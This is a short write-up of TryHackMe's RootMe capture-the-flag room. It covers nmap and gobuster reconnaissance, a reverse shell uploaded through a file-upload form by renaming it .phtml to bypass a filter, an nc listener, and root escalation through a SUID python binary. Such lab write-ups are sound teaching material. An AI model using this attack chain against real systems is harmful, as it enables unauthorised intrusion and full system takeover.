# RootMe

This is a (very) brief write-up for [TryHackMe's RootMe CTF](https://tryhackme.com/room/rrootme). 

## Recon

### nmap 
`$ nmap -A 10.10.85.168`


>PORT   STATE SERVICE VERSION\
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\
| ssh-hostkey: \
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)\
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)\
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)\
\
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\
| http-cookie-flags: \
|   /: \
|     PHPSESSID: \
|_      httponly flag not set\
|_http-server-header: Apache/2.4.29 (Ubuntu)\
|_http-title: HackIT - Home\
MAC Address: 02:F6:41:A2:CA:67 (Unknown)\
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\
TCP/IP fingerprint:\
OS:SCAN(V=7.60%E=4%D=6/22%OT=22%CT=1%CU=37178%PV=Y%DS=1%DC=D%G=Y%M=02F641%T
OS:M=6494B96F%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)
OS:OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=
OS:M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6
OS:=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)\
Network Distance: 1 hop\
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\
TRACEROUTE\
HOP RTT      ADDRESS\
1   18.56 ms ip-10-10-85-168.eu-west-1.compute.internal (10.10.85.168)

### Gobuster

`$ gobuster dir -u 10.10.85.168 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

>/uploads (Status: 301)\
/css (Status: 301)\
/js (Status: 301)\
/panel (Status: 301)\
/server-status (Status: 403)

## Shell

http://10.10.85.168/panel/ has a file upload form.

Use [Pentest Monkey's php shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and change the file extention to `.phtml` because `.php` is blocked. 

`$ nc -nvlp 9001` so we can listen for the shell to connect back.

Go to 
http://10.10.85.168/uploads/ and click the shell to activate it. 

### Stabalizing the shell

`$ python3 -c 'import pty;pty.spawn("/bin/bash")'`\
CTRL + z\
`$ stty raw -echo; fg`\
`$ export TERM=xterm`

The shell is stable and we see that we are `www-data`.

## Escalation

`$ find / -user root -perm /4000 2>/dev/null` to find files with SUID set.

`/usr/bin/python` is unusual. [What does it say on GTFOBins?](https://gtfobins.github.io/gtfobins/python/#suid)

`$ python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`
We have a root shell now!
